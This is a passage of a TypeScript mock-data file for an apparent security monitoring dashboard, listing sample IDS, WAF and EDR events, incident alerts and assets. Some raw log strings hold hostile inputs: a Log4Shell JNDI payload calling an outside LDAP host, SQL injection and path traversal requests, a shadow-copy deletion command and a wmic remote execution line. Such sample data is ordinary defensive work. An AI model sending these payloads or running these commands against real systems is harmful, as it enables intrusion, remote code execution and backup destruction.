import { subMinutes, subHours, subDays, format } from "date-fns";

const now = new Date();

// ─── SECURITY EVENTS ───────────────────────────────────────────────────────────
export type Severity = "critical" | "high" | "medium" | "low" | "info";
export type EventType =
  | "intrusion"
  | "malware"
  | "brute_force"
  | "port_scan"
  | "data_exfiltration"
  | "privilege_escalation"
  | "lateral_movement"
  | "phishing"
  | "ransomware"
  | "c2_communication"
  | "policy_violation"
  | "authentication"
  | "network_anomaly"
  | "vulnerability_exploit";

export interface SecurityEvent {
  id: string;
  timestamp: Date;
  severity: Severity;
  type: EventType;
  source: string;
  sourceIp: string;
  destIp?: string;
  host: string;
  user?: string;
  description: string;
  rawLog: string;
  ruleId: string;
  mitreTactic?: string;
  mitreTechnique?: string;
}

export const securityEvents: SecurityEvent[] = [
  {
    id: "evt-001",
    timestamp: subMinutes(now, 2),
    severity: "critical",
    type: "intrusion",
    source: "Suricata IDS",
    sourceIp: "185.220.101.45",
    destIp: "10.0.1.15",
    host: "web-prod-01",
    description: "ET EXPLOIT Possible CVE-2024-3094 XZ Utils RCE Attempt",
    rawLog: 'alert tcp 185.220.101.45 any -> 10.0.1.15 22 (msg:"ET EXPLOIT CVE-2024-3094"; sid:2048932;)',
    ruleId: "SID-2048932",
    mitreTactic: "Initial Access",
    mitreTechnique: "Exploit Public-Facing Application",
  },
  {
    id: "evt-002",
    timestamp: subMinutes(now, 5),
    severity: "critical",
    type: "malware",
    source: "ClamAV",
    sourceIp: "10.0.2.44",
    host: "workstation-14",
    user: "jsmith",
    description: "Trojan.Emotet-Gen detected in memory — process injection active",
    rawLog: "FOUND: Trojan.Emotet-Gen PID:4821 /tmp/.cache/svchost.exe MEMORY",
    ruleId: "CLAM-EMO-001",
    mitreTactic: "Execution",
    mitreTechnique: "Process Injection",
  },
  {
    id: "evt-003",
    timestamp: subMinutes(now, 8),
    severity: "high",
    type: "brute_force",
    source: "Fail2Ban",
    sourceIp: "91.108.56.130",
    destIp: "10.0.1.10",
    host: "ssh-gateway",
    description: "SSH brute force: 847 failed attempts in 60 seconds",
    rawLog: "2024-12-15 03:41:22 [sshd] Ban 91.108.56.130 (847 failures in 60s)",
    ruleId: "F2B-SSH-002",
    mitreTactic: "Credential Access",
    mitreTechnique: "Brute Force",
  },
  {
    id: "evt-004",
    timestamp: subMinutes(now, 12),
    severity: "high",
    type: "data_exfiltration",
    source: "DLP Engine",
    sourceIp: "10.0.3.22",
    destIp: "104.21.88.200",
    host: "fin-server-02",
    user: "mwilson",
    description: "Large data transfer to external IP — 4.2 GB over HTTPS",
    rawLog: "DLP ALERT: OUTBOUND 10.0.3.22->104.21.88.200 4294MB HTTPS proto=TLS1.3",
    ruleId: "DLP-EXF-007",
    mitreTactic: "Exfiltration",
    mitreTechnique: "Exfiltration Over C2 Channel",
  },
  {
    id: "evt-005",
    timestamp: subMinutes(now, 15),
    severity: "high",
    type: "privilege_escalation",
    source: "Auditd",
    sourceIp: "10.0.2.55",
    host: "db-primary",
    user: "backup_svc",
    description: "Sudo privilege escalation by service account — anomalous",
    rawLog: "type=SYSCALL msg=audit(1734302482.445:1337): arch=x86_64 syscall=execve a0=sudo a1=su",
    ruleId: "AUD-PRIV-003",
    mitreTactic: "Privilege Escalation",
    mitreTechnique: "Sudo and Sudo Caching",
  },
  {
    id: "evt-006",
    timestamp: subMinutes(now, 18),
    severity: "medium",
    type: "port_scan",
    source: "Suricata IDS",
    sourceIp: "10.0.2.77",
    host: "internal-net",
    description: "Internal host performing SYN scan across /24 subnet",
    rawLog: "ALERT ET SCAN Nmap Scripting Engine Scan (internal) 10.0.2.77 -> 10.0.2.0/24",
    ruleId: "SID-2000537",
    mitreTactic: "Discovery",
    mitreTechnique: "Network Service Discovery",
  },
  {
    id: "evt-007",
    timestamp: subMinutes(now, 22),
    severity: "critical",
    type: "ransomware",
    source: "EDR Agent",
    sourceIp: "10.0.4.31",
    host: "hr-workstation-07",
    user: "ajenkins",
    description: "LockBit 3.0 ransomware behavior — mass file encryption detected",
    rawLog: "EDR: RANSOMWARE_BEHAVIOR host=hr-workstation-07 user=ajenkins files_encrypted=1247 ext=.lockbit3",
    ruleId: "EDR-RANSOM-001",
    mitreTactic: "Impact",
    mitreTechnique: "Data Encrypted for Impact",
  },
  {
    id: "evt-008",
    timestamp: subMinutes(now, 25),
    severity: "high",
    type: "c2_communication",
    source: "Suricata IDS",
    sourceIp: "10.0.2.44",
    destIp: "45.33.32.156",
    host: "workstation-14",
    description: "Cobalt Strike beacon detected — periodic C2 callback",
    rawLog: "ALERT ET CNC Cobalt Strike Beacon Observed 10.0.2.44->45.33.32.156:443 interval=60s",
    ruleId: "SID-2027865",
    mitreTactic: "Command and Control",
    mitreTechnique: "Application Layer Protocol",
  },
  {
    id: "evt-009",
    timestamp: subMinutes(now, 30),
    severity: "high",
    type: "lateral_movement",
    source: "Windows Event Log",
    sourceIp: "10.0.2.44",
    destIp: "10.0.3.15",
    host: "dc-01",
    user: "jsmith",
    description: "Pass-the-Hash detected: NTLM auth without prior credential entry",
    rawLog: "EventID 4624 LogonType=3 AuthPkg=NTLM SubjectUser=jsmith WorkstationName=workstation-14",
    ruleId: "WIN-PTH-001",
    mitreTactic: "Lateral Movement",
    mitreTechnique: "Pass the Hash",
  },
  {
    id: "evt-010",
    timestamp: subMinutes(now, 35),
    severity: "medium",
    type: "phishing",
    source: "Email Gateway",
    sourceIp: "209.85.220.41",
    host: "mail-server",
    user: "rthomas",
    description: "Phishing email with malicious attachment blocked — Office macro dropper",
    rawLog: "BLOCKED: FROM=phish@evil-domain.ru SUBJECT='Invoice_Q4.docm' ATTACH=malicious_macro SCORE=98",
    ruleId: "MAIL-PHISH-012",
    mitreTactic: "Initial Access",
    mitreTechnique: "Phishing",
  },
  {
    id: "evt-011",
    timestamp: subMinutes(now, 40),
    severity: "medium",
    type: "authentication",
    source: "Active Directory",
    sourceIp: "10.0.5.22",
    host: "dc-01",
    user: "klee",
    description: "Multiple failed AD authentications — possible credential stuffing",
    rawLog: "EventID 4771 KerberosPreauthFailed Account=klee FailCount=23 IP=10.0.5.22",
    ruleId: "AD-AUTH-003",
    mitreTactic: "Credential Access",
    mitreTechnique: "Kerberoasting",
  },
  {
    id: "evt-012",
    timestamp: subMinutes(now, 45),
    severity: "low",
    type: "policy_violation",
    source: "DLP Engine",
    sourceIp: "10.0.4.88",
    host: "dev-laptop-03",
    user: "dchen",
    description: "USB storage device connected — sensitive data policy violation",
    rawLog: "DLP WARN: USB_STORAGE device=SanDisk_Cruzer host=dev-laptop-03 user=dchen files_accessed=14",
    ruleId: "DLP-USB-002",
    mitreTactic: "Collection",
    mitreTechnique: "Data from Removable Media",
  },
  {
    id: "evt-013",
    timestamp: subMinutes(now, 50),
    severity: "high",
    type: "vulnerability_exploit",
    source: "WAF",
    sourceIp: "192.168.100.50",
    destIp: "10.0.1.15",
    host: "web-prod-01",
    description: "SQL injection attempt blocked — UNION-based extraction",
    rawLog: "WAF BLOCK: SQL_INJECTION src=192.168.100.50 path=/api/users param=id payload=1+UNION+SELECT+*+FROM+users",
    ruleId: "WAF-SQLI-007",
    mitreTactic: "Initial Access",
    mitreTechnique: "Exploit Public-Facing Application",
  },
  {
    id: "evt-014",
    timestamp: subMinutes(now, 55),
    severity: "low",
    type: "network_anomaly",
    source: "NetFlow",
    sourceIp: "10.0.3.99",
    host: "storage-nas",
    description: "Unusual outbound traffic spike — 300% above baseline",
    rawLog: "NETFLOW ANOMALY host=storage-nas traffic=4.7Gbps baseline=1.2Gbps delta=+291%",
    ruleId: "NET-ANOM-005",
    mitreTactic: "Exfiltration",
    mitreTechnique: "Automated Exfiltration",
  },
  {
    id: "evt-015",
    timestamp: subHours(now, 1),
    severity: "critical",
    type: "intrusion",
    source: "Suricata IDS",
    sourceIp: "185.191.126.91",
    destIp: "10.0.1.25",
    host: "vpn-gateway",
    description: "Ivanti ConnectSecure CVE-2024-21887 exploitation attempt",
    rawLog: 'alert http 185.191.126.91 -> 10.0.1.25 (msg:"ET EXPLOIT Ivanti CVE-2024-21887 RCE"; sid:2051234;)',
    ruleId: "SID-2051234",
    mitreTactic: "Initial Access",
    mitreTechnique: "Exploit Public-Facing Application",
  },
  {
    id: "evt-016",
    timestamp: subHours(now, 1.2),
    severity: "medium",
    type: "lateral_movement",
    source: "Windows Event Log",
    sourceIp: "10.0.2.33",
    destIp: "10.0.2.55",
    host: "workstation-08",
    user: "svc_deploy",
    description: "PsExec remote execution detected — service account",
    rawLog: "EventID 7045 ServiceName=PSEXESVC ImagePath=\\\\workstation-08\\ADMIN$\\PSEXESVC.exe",
    ruleId: "WIN-PSEXEC-001",
    mitreTactic: "Lateral Movement",
    mitreTechnique: "Remote Services",
  },
  {
    id: "evt-017",
    timestamp: subHours(now, 1.5),
    severity: "high",
    type: "malware",
    source: "EDR Agent",
    sourceIp: "10.0.5.11",
    host: "finance-ws-02",
    user: "pgarcia",
    description: "AgentTesla keylogger detected — credential harvesting active",
    rawLog: "EDR: MALWARE_DETECTED host=finance-ws-02 family=AgentTesla sha256=a3f7d8e2c1b94065 action=quarantined",
    ruleId: "EDR-KLOG-003",
    mitreTactic: "Collection",
    mitreTechnique: "Input Capture",
  },
  {
    id: "evt-018",
    timestamp: subHours(now, 2),
    severity: "medium",
    type: "port_scan",
    source: "Suricata IDS",
    sourceIp: "45.141.84.22",
    host: "dmz-fw",
    description: "External SYN scan targeting RDP port 3389 across IP range",
    rawLog: "ALERT ET SCAN Potential RDP Scan 45.141.84.22 -> 203.0.113.0/24:3389 packets=4821",
    ruleId: "SID-2001569",
    mitreTactic: "Reconnaissance",
    mitreTechnique: "Active Scanning",
  },
  {
    id: "evt-019",
    timestamp: subHours(now, 2.5),
    severity: "high",
    type: "c2_communication",
    source: "DNS Sinkhole",
    sourceIp: "10.0.4.67",
    host: "ops-ws-12",
    description: "Sliver C2 framework DNS beacon — sinkholed domain queried",
    rawLog: "DNS SINKHOLE: host=ops-ws-12 query=update.microsoft-cdn.net (IOC match) sinkhole=true",
    ruleId: "DNS-SINK-008",
    mitreTactic: "Command and Control",
    mitreTechnique: "DNS",
  },
  {
    id: "evt-020",
    timestamp: subHours(now, 3),
    severity: "low",
    type: "authentication",
    source: "VPN Gateway",
    sourceIp: "203.0.113.77",
    host: "vpn-gateway",
    user: "bmartin",
    description: "VPN login from new geolocation — Tokyo, JP (user normally US)",
    rawLog: "VPN AUTH: user=bmartin ip=203.0.113.77 geo=Tokyo,JP new_location=true mfa=bypass_attempted",
    ruleId: "VPN-GEO-002",
    mitreTactic: "Initial Access",
    mitreTechnique: "Valid Accounts",
  },
  {
    id: "evt-021",
    timestamp: subHours(now, 3.5),
    severity: "critical",
    type: "privilege_escalation",
    source: "Linux Auditd",
    sourceIp: "10.0.1.88",
    host: "kube-master-01",
    user: "webapp",
    description: "Container escape attempt — privileged namespace breakout",
    rawLog: "AUDITD: CONTAINER_ESCAPE uid=1000(webapp) -> uid=0(root) cgroup_ns=host privileged=true",
    ruleId: "AUD-CESC-001",
    mitreTactic: "Privilege Escalation",
    mitreTechnique: "Escape to Host",
  },
  {
    id: "evt-022",
    timestamp: subHours(now, 4),
    severity: "medium",
    type: "policy_violation",
    source: "CASB",
    sourceIp: "10.0.6.34",
    host: "exec-laptop-01",
    user: "ceo_acct",
    description: "Sensitive documents uploaded to personal Dropbox — data governance violation",
    rawLog: "CASB ALERT: user=ceo_acct cloud=Dropbox(personal) files=47 classification=CONFIDENTIAL",
    ruleId: "CASB-DLP-003",
    mitreTactic: "Exfiltration",
    mitreTechnique: "Exfiltration to Cloud Storage",
  },
  {
    id: "evt-023",
    timestamp: subHours(now, 4.5),
    severity: "high",
    type: "intrusion",
    source: "WAF",
    sourceIp: "91.92.241.105",
    destIp: "10.0.1.15",
    host: "web-prod-01",
    description: "Path traversal attack — /etc/passwd access attempted",
    rawLog: "WAF BLOCK: PATH_TRAVERSAL src=91.92.241.105 path=/../../../etc/passwd HTTP/1.1 403",
    ruleId: "WAF-TRAV-004",
    mitreTactic: "Discovery",
    mitreTechnique: "File and Directory Discovery",
  },
  {
    id: "evt-024",
    timestamp: subHours(now, 5),
    severity: "medium",
    type: "brute_force",
    source: "Active Directory",
    sourceIp: "10.0.7.22",
    host: "dc-01",
    user: "multiple",
    description: "Password spray attack — 52 accounts targeted with common passwords",
    rawLog: "AD ALERT: PASSWORD_SPRAY accounts=52 src=10.0.7.22 status=PARTIAL_SUCCESS (3 valid)",
    ruleId: "AD-SPRAY-001",
    mitreTactic: "Credential Access",
    mitreTechnique: "Password Spraying",
  },
  {
    id: "evt-025",
    timestamp: subHours(now, 5.5),
    severity: "info",
    type: "authentication",
    source: "Active Directory",
    sourceIp: "10.0.1.1",
    host: "dc-01",
    user: "admin",
    description: "Admin account login outside business hours",
    rawLog: "EventID 4624 Account=DOMAIN\\admin LogonType=10 Time=02:34:17 IP=10.0.1.1",
    ruleId: "AD-HOURS-001",
    mitreTactic: "Initial Access",
    mitreTechnique: "Valid Accounts",
  },
  {
    id: "evt-026",
    timestamp: subHours(now, 6),
    severity: "high",
    type: "vulnerability_exploit",
    source: "Suricata IDS",
    sourceIp: "185.220.100.241",
    destIp: "10.0.1.55",
    host: "citrix-gateway",
    description: "CitrixBleed CVE-2023-4966 exploitation — session token theft",
    rawLog: "ALERT ET EXPLOIT CitrixBleed CVE-2023-4966 185.220.100.241 -> 10.0.1.55:443",
    ruleId: "SID-2049871",
    mitreTactic: "Credential Access",
    mitreTechnique: "Steal Web Session Cookie",
  },
  {
    id: "evt-027",
    timestamp: subHours(now, 7),
    severity: "low",
    type: "network_anomaly",
    source: "NetFlow",
    sourceIp: "10.0.2.100",
    host: "app-server-03",
    description: "Beaconing behavior detected — regular 30-second intervals to external IP",
    rawLog: "NETFLOW: host=app-server-03 dst=45.33.32.156 interval=30s duration=6h pattern=BEACON",
    ruleId: "NET-BEACON-003",
    mitreTactic: "Command and Control",
    mitreTechnique: "Scheduled Transfer",
  },
  {
    id: "evt-028",
    timestamp: subHours(now, 8),
    severity: "high",
    type: "malware",
    source: "EDR Agent",
    sourceIp: "10.0.3.45",
    host: "accounting-ws-01",
    user: "lnguyen",
    description: "QakBot banking trojan — credential stealing and propagation",
    rawLog: "EDR: TROJAN_BEHAVIOR family=QakBot host=accounting-ws-01 modules=keylogger,credential_stealer,worm",
    ruleId: "EDR-QBOT-001",
    mitreTactic: "Execution",
    mitreTechnique: "User Execution",
  },
  {
    id: "evt-029",
    timestamp: subHours(now, 9),
    severity: "medium",
    type: "data_exfiltration",
    source: "Suricata IDS",
    sourceIp: "10.0.2.88",
    destIp: "185.199.108.133",
    host: "dev-server-02",
    user: "devops",
    description: "Git repository pushed to external GitHub — source code leak risk",
    rawLog: "SURICATA: git_push src=10.0.2.88 dst=185.199.108.133 repo=internal-api size=847MB",
    ruleId: "SID-GIT-002",
    mitreTactic: "Exfiltration",
    mitreTechnique: "Transfer Data to Cloud Account",
  },
  {
    id: "evt-030",
    timestamp: subHours(now, 10),
    severity: "low",
    type: "policy_violation",
    source: "Endpoint Agent",
    sourceIp: "10.0.4.22",
    host: "contractor-laptop-02",
    description: "Unauthorized software installed — Tor Browser detected",
    rawLog: "ENDPOINT ALERT: SOFTWARE_INSTALL name=TorBrowser version=13.0 host=contractor-laptop-02",
    ruleId: "EP-SOFT-007",
    mitreTactic: "Defense Evasion",
    mitreTechnique: "Proxy",
  },
  {
    id: "evt-031",
    timestamp: subHours(now, 11),
    severity: "critical",
    type: "intrusion",
    source: "Suricata IDS",
    sourceIp: "91.92.244.7",
    destIp: "10.0.1.35",
    host: "jenkins-01",
    description: "Jenkins CVE-2024-23897 arbitrary file read exploited",
    rawLog: "ALERT ET EXPLOIT Jenkins CVE-2024-23897 src=91.92.244.7 path=/jenkins/cli/file=../../secret.key",
    ruleId: "SID-2051890",
    mitreTactic: "Initial Access",
    mitreTechnique: "Exploit Public-Facing Application",
  },
  {
    id: "evt-032",
    timestamp: subHours(now, 12),
    severity: "high",
    type: "lateral_movement",
    source: "Windows Event Log",
    sourceIp: "10.0.2.44",
    destIp: "10.0.2.22",
    host: "file-server-01",
    user: "jsmith",
    description: "WMI remote command execution — fileless lateral movement",
    rawLog: "EventID 4688 CommandLine=wmic /node:10.0.2.22 process call create cmd.exe User=jsmith",
    ruleId: "WIN-WMI-002",
    mitreTactic: "Lateral Movement",
    mitreTechnique: "Windows Management Instrumentation",
  },
  {
    id: "evt-033",
    timestamp: subHours(now, 13),
    severity: "medium",
    type: "c2_communication",
    source: "Suricata IDS",
    sourceIp: "10.0.3.77",
    destIp: "194.165.16.88",
    host: "web-dev-04",
    description: "Metasploit Meterpreter reverse shell session established",
    rawLog: "ALERT ET TROJAN Meterpreter Reverse TCP 10.0.3.77->194.165.16.88:4444 session=established",
    ruleId: "SID-2019768",
    mitreTactic: "Command and Control",
    mitreTechnique: "Non-Standard Port",
  },
  {
    id: "evt-034",
    timestamp: subHours(now, 14),
    severity: "high",
    type: "ransomware",
    source: "EDR Agent",
    sourceIp: "10.0.5.55",
    host: "backup-server-01",
    description: "Volume Shadow Copy deletion detected — ransomware pre-encryption stage",
    rawLog: "EDR: VSS_DELETE cmd='vssadmin delete shadows /all /quiet' host=backup-server-01 blocked=false",
    ruleId: "EDR-VSS-001",
    mitreTactic: "Impact",
    mitreTechnique: "Inhibit System Recovery",
  },
  {
    id: "evt-035",
    timestamp: subHours(now, 15),
    severity: "medium",
    type: "phishing",
    source: "Email Gateway",
    sourceIp: "173.245.48.1",
    host: "mail-server",
    user: "twhite",
    description: "Business Email Compromise attempt — CEO impersonation wire transfer request",
    rawLog: "EMAIL WARN: BEC_ATTEMPT from=ceo@company-corp.net(spoofed) to=finance@company.com request=wire_transfer",
    ruleId: "MAIL-BEC-003",
    mitreTactic: "Initial Access",
    mitreTechnique: "Phishing",
  },
  {
    id: "evt-036",
    timestamp: subHours(now, 16),
    severity: "low",
    type: "authentication",
    source: "O365 CASB",
    sourceIp: "104.215.148.63",
    host: "cloud-identity",
    user: "mwilson",
    description: "MFA push notification fatigue attack — 23 consecutive MFA requests",
    rawLog: "O365: MFA_FATIGUE user=mwilson requests=23 approved=0 source_ip=104.215.148.63",
    ruleId: "O365-MFA-001",
    mitreTactic: "Credential Access",
    mitreTechnique: "Multi-Factor Authentication Request Generation",
  },
  {
    id: "evt-037",
    timestamp: subHours(now, 17),
    severity: "info",
    type: "network_anomaly",
    source: "NetFlow",
    sourceIp: "10.0.1.200",
    host: "printers-vlan",
    description: "Printer joining unexpected VLAN — misconfiguration or rogue device",
    rawLog: "NETFLOW: src=10.0.1.200 vlan_change=true old_vlan=10 new_vlan=1 mac=00:1A:2B:3C:4D:5E",
    ruleId: "NET-VLAN-001",
    mitreTactic: "Discovery",
    mitreTechnique: "Network Sniffing",
  },
  {
    id: "evt-038",
    timestamp: subHours(now, 18),
    severity: "high",
    type: "vulnerability_exploit",
    source: "Suricata IDS",
    sourceIp: "185.232.23.99",
    destIp: "10.0.1.44",
    host: "exchange-01",
    description: "ProxyShell CVE-2021-34473 exploitation — Exchange server targeted",
    rawLog: "ALERT ET EXPLOIT MS Exchange ProxyShell RCE 185.232.23.99->10.0.1.44:443 path=/autodiscover",
    ruleId: "SID-2033447",
    mitreTactic: "Initial Access",
    mitreTechnique: "Exploit Public-Facing Application",
  },
  {
    id: "evt-039",
    timestamp: subHours(now, 20),
    severity: "medium",
    type: "data_exfiltration",
    source: "DLP Engine",
    sourceIp: "10.0.6.12",
    host: "research-ws-01",
    user: "rthompson",
    description: "PII data detected in outbound email — GDPR violation risk",
    rawLog: "DLP BLOCK: EMAIL_PII user=rthompson recipient=personal@gmail.com content=SSN,CREDIT_CARD count=234",
    ruleId: "DLP-PII-009",
    mitreTactic: "Exfiltration",
    mitreTechnique: "Exfiltration Over Alternative Protocol",
  },
  {
    id: "evt-040",
    timestamp: subHours(now, 22),
    severity: "critical",
    type: "malware",
    source: "EDR Agent",
    sourceIp: "10.0.2.91",
    host: "exec-ws-01",
    user: "vpcox",
    description: "UEFI bootkit detected — firmware-level persistence (BlackLotus)",
    rawLog: "EDR: FIRMWARE_IMPLANT type=UEFI_BOOTKIT family=BlackLotus host=exec-ws-01 stage=pre-boot",
    ruleId: "EDR-UEFI-001",
    mitreTactic: "Persistence",
    mitreTechnique: "Pre-OS Boot",
  },
  {
    id: "evt-041",
    timestamp: subHours(now, 23),
    severity: "high",
    type: "intrusion",
    source: "Suricata IDS",
    sourceIp: "45.89.175.22",
    destIp: "10.0.1.15",
    host: "web-prod-01",
    description: "Log4Shell CVE-2021-44228 JNDI injection attempt",
    rawLog: "ALERT ET EXPLOIT Apache Log4j RCE 45.89.175.22 header=X-Api-Version value=${jndi:ldap://45.89.175.22/a}",
    ruleId: "SID-2034647",
    mitreTactic: "Initial Access",
    mitreTechnique: "Exploit Public-Facing Application",
  },
];

// ─── TIMELINE DATA (24h) ───────────────────────────────────────────────────────
export const timelineData = Array.from({ length: 24 }, (_, i) => {
  const h = 23 - i;
  const total = Math.floor(Math.random() * 180 + 40);
  const critical = Math.floor(Math.random() * (h < 4 ? 25 : 8) + (h < 4 ? 5 : 0));
  return {
    time: format(subHours(now, h), "HH:mm"),
    total,
    critical,
  };
}).reverse();

// ─── ALERTS ────────────────────────────────────────────────────────────────────
export type AlertStatus = "open" | "acknowledged" | "investigating" | "resolved" | "closed";

export interface Alert {
  id: string;
  timestamp: Date;
  severity: Severity;
  title: string;
  description: string;
  affectedHost: string;
  mitreTactic: string;
  mitreTechnique: string;
  mitreId: string;
  status: AlertStatus;
  assignee?: string;
  eventCount: number;
  notes?: string;
  relatedEvents: string[];
}

export const alerts: Alert[] = [
  {
    id: "alrt-001",
    timestamp: subMinutes(now, 3),
    severity: "critical",
    title: "Active Ransomware Campaign — LockBit 3.0",
    description: "LockBit 3.0 ransomware detected actively encrypting files on hr-workstation-07. Volume shadow copies have been deleted. Lateral movement indicators present.",
    affectedHost: "hr-workstation-07",
    mitreTactic: "Impact",
    mitreTechnique: "Data Encrypted for Impact",
    mitreId: "T1486",
    status: "investigating",
    assignee: "J. Martinez",
    eventCount: 47,
    notes: "Isolated host from network at 03:42 UTC. Initiating IR playbook. Backup verification in progress.",
    relatedEvents: ["evt-007", "evt-034"],
  },
  {
    id: "alrt-002",
    timestamp: subMinutes(now, 8),
    severity: "critical",
    title: "XZ Utils CVE-2024-3094 RCE Exploit Attempt",
    description: "Active exploitation attempt of CVE-2024-3094 XZ Utils backdoor against internet-facing SSH service. Multiple source IPs indicate coordinated attack.",
    affectedHost: "web-prod-01",
    mitreTactic: "Initial Access",
    mitreTechnique: "Exploit Public-Facing Application",
    mitreId: "T1190",
    status: "open",
    eventCount: 12,
    relatedEvents: ["evt-001"],
  },
  {
    id: "alrt-003",
    timestamp: subMinutes(now, 15),
    severity: "critical",
    title: "Cobalt Strike C2 Beaconing — Active Intrusion",
    description: "Cobalt Strike beacon detected on workstation-14. Host previously compromised with Emotet malware. Pass-the-hash lateral movement to dc-01 observed.",
    affectedHost: "workstation-14",
    mitreTactic: "Command and Control",
    mitreTechnique: "Application Layer Protocol",
    mitreId: "T1071",
    status: "investigating",
    assignee: "K. Thompson",
    eventCount: 89,
    notes: "Memory forensics collection in progress. Network isolation applied at perimeter. Threat actor TTPs match APT29 profile.",
    relatedEvents: ["evt-002", "evt-008", "evt-009"],
  },
  {
    id: "alrt-004",
    timestamp: subMinutes(now, 25),
    severity: "high",
    title: "SSH Brute Force — Credential Attack",
    description: "Sustained SSH brute force attack from Tor exit node. 847 failed attempts in 60 seconds against SSH gateway.",
    affectedHost: "ssh-gateway",
    mitreTactic: "Credential Access",
    mitreTechnique: "Brute Force",
    mitreId: "T1110",
    status: "acknowledged",
    assignee: "L. Chen",
    eventCount: 847,
    notes: "Source IP blocked at perimeter firewall. Monitoring for additional source IPs.",
    relatedEvents: ["evt-003"],
  },
  {
    id: "alrt-005",
    timestamp: subMinutes(now, 35),
    severity: "high",
    title: "Large-Scale Data Exfiltration Detected",
    description: "4.2 GB data transfer from financial server to external IP over HTTPS. User mwilson account used — possible insider threat or compromised credentials.",
    affectedHost: "fin-server-02",
    mitreTactic: "Exfiltration",
    mitreTechnique: "Exfiltration Over C2 Channel",
    mitreId: "T1041",
    status: "investigating",
    assignee: "J. Martinez",
    eventCount: 3,
    notes: "HR and Legal notified. User account suspended pending investigation. Forensic image requested.",
    relatedEvents: ["evt-004"],
  },
  {
    id: "alrt-006",
    timestamp: subHours(now, 1),
    severity: "high",
    title: "Container Escape Attempt on Kubernetes Master",
    description: "Webapp container attempted privileged namespace breakout on kube-master-01. Root access obtained within container.",
    affectedHost: "kube-master-01",
    mitreTactic: "Privilege Escalation",
    mitreTechnique: "Escape to Host",
    mitreId: "T1611",
    status: "resolved",
    assignee: "D. Park",
    eventCount: 7,
    notes: "Container isolated and terminated. Pod security policies updated. Vulnerability patched (runc CVE-2024-21626).",
    relatedEvents: ["evt-021"],
  },
  {
    id: "alrt-007",
    timestamp: subHours(now, 2),
    severity: "high",
    title: "Ivanti ConnectSecure CVE-2024-21887 Exploitation",
    description: "Active exploitation of Ivanti VPN appliance. Command injection vulnerability targeted. Patch not yet applied.",
    affectedHost: "vpn-gateway",
    mitreTactic: "Initial Access",
    mitreTechnique: "Exploit Public-Facing Application",
    mitreId: "T1190",
    status: "open",
    eventCount: 5,
    relatedEvents: ["evt-015"],
  },
  {
    id: "alrt-008",
    timestamp: subHours(now, 3),
    severity: "medium",
    title: "Password Spray — 52 Accounts Targeted",
    description: "Internal host performing slow password spray against Active Directory. 3 accounts successfully compromised with common passwords.",
    affectedHost: "dc-01",
    mitreTactic: "Credential Access",
    mitreTechnique: "Password Spraying",
    mitreId: "T1110.003",
    status: "acknowledged",
    assignee: "L. Chen",
    eventCount: 52,
    notes: "Compromised accounts disabled. Password reset enforced. MFA enrollment pushed to all users.",
    relatedEvents: ["evt-024"],
  },
  {
    id: "alrt-009",
    timestamp: subHours(now, 5),
    severity: "critical",
    title: "UEFI Bootkit Persistence — BlackLotus",
    description: "BlackLotus UEFI bootkit detected on executive workstation. Firmware-level persistence survives OS reinstall. Requires hardware-level remediation.",
    affectedHost: "exec-ws-01",
    mitreTactic: "Persistence",
    mitreTechnique: "Pre-OS Boot",
    mitreId: "T1542",
    status: "open",
    eventCount: 2,
    relatedEvents: ["evt-040"],
  },
  {
    id: "alrt-010",
    timestamp: subHours(now, 8),
    severity: "medium",
    title: "BEC Phishing — CEO Wire Transfer Request",
    description: "Business Email Compromise attempt impersonating CEO. Finance team targeted with urgent wire transfer request for $485,000.",
    affectedHost: "mail-server",
    mitreTactic: "Initial Access",
    mitreTechnique: "Phishing",
    mitreId: "T1566",
    status: "closed",
    assignee: "J. Martinez",
    eventCount: 1,
    notes: "Email blocked at gateway. Finance team notified. Domain spoofing reported to registrar.",
    relatedEvents: ["evt-035"],
  },
  {
    id: "alrt-011",
    timestamp: subHours(now, 10),
    severity: "high",
    title: "Jenkins CVE-2024-23897 — Arbitrary File Read",
    description: "Jenkins CI/CD server targeted with CVE-2024-23897. Attacker attempting to read credential files and pipeline secrets.",
    affectedHost: "jenkins-01",
    mitreTactic: "Initial Access",
    mitreTechnique: "Exploit Public-Facing Application",
    mitreId: "T1190",
    status: "resolved",
    assignee: "D. Park",
    eventCount: 8,
    notes: "Jenkins updated to 2.442+. All API tokens rotated. Pipeline secrets moved to HashiCorp Vault.",
    relatedEvents: ["evt-031"],
  },
  {
    id: "alrt-012",
    timestamp: subHours(now, 15),
    severity: "high",
    title: "Volume Shadow Copy Deletion",
    description: "vssadmin used to delete all volume shadow copies on backup server — classic ransomware pre-encryption behavior.",
    affectedHost: "backup-server-01",
    mitreTactic: "Impact",
    mitreTechnique: "Inhibit System Recovery",
    mitreId: "T1490",
    status: "acknowledged",
    assignee: "K. Thompson",
    eventCount: 1,
    notes: "Off-site backup integrity verified. Host quarantined for investigation.",
    relatedEvents: ["evt-034"],
  },
];

// ─── ASSETS ────────────────────────────────────────────────────────────────────
export type AssetType = "server" | "workstation" | "network" | "cloud" | "iot" | "mobile";
export type AssetStatus = "online" | "offline" | "quarantined" | "degraded";

export interface Asset {
  id: string;
  hostname: string;
  ip: string;
  os: string;
  type: AssetType;
  status: AssetStatus;
  riskScore: number;
  agentVersion: string;
  lastSeen: Date;
  owner: string;
  location: string;
  tags: string[];
}

export const assets: Asset[] = [
  { id: "ast-001", hostname: "web-prod-01", ip: "10.0.1.15", os: "Ubuntu 22.04 LTS", type: "server", status: "online", riskScore: 87, agentVersion: "4.7.2", lastSeen: subMinutes(now, 1), owner: "Platform Team", location: "AWS us-east-1", tags: ["production", "internet-facing", "critical"] },
  { id: "ast-002", hostname: "db-primary", ip: "10.0.2.55", os: "RHEL 9.2", type: "server", status: "online", riskScore: 72, agentVersion: "4.7.2", lastSeen: subMinutes(now, 2), owner: "Database Team", location: "DC-1 Rack-A3", tags: ["production", "pii", "critical"] },
  { id: "ast-003", hostname: "workstation-14", ip: "10.0.2.44", os: "Windows 11 Pro 23H2", type: "workstation", status: "quarantined", riskScore: 98, agentVersion: "4.7.1", lastSeen: subMinutes(now, 5), owner: "J. Smith", location: "HQ Floor 3", tags: ["compromised", "isolated"] },
  { id: "ast-004", hostname: "dc-01", ip: "10.0.3.15", os: "Windows Server 2022", type: "server", status: "online", riskScore: 45, agentVersion: "4.7.2", lastSeen: subMinutes(now, 1), owner: "IT Ops", location: "DC-1 Rack-B1", tags: ["critical", "active-directory"] },
